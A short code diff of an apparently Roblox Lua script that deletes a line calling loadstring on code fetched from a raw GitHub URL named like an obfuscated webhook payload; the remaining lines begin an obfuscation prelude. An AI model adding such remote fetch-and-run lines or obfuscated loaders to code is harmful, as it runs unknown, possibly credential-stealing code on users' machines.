@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/obfWehook_DMshjabdkanns78Wr1arwjjsbsjanNNfAtRitJdkoqnfbjakndCQSf6Opdd8C1AsQ01cfrLHh47jakendjjahai65v7sjjajwhan6PU653c3q31sDpRJajhdiajjwdC.lua", true))();
-
 local v0 = string.char;
 local v1 = string.byte;
 local v2 = string.sub;
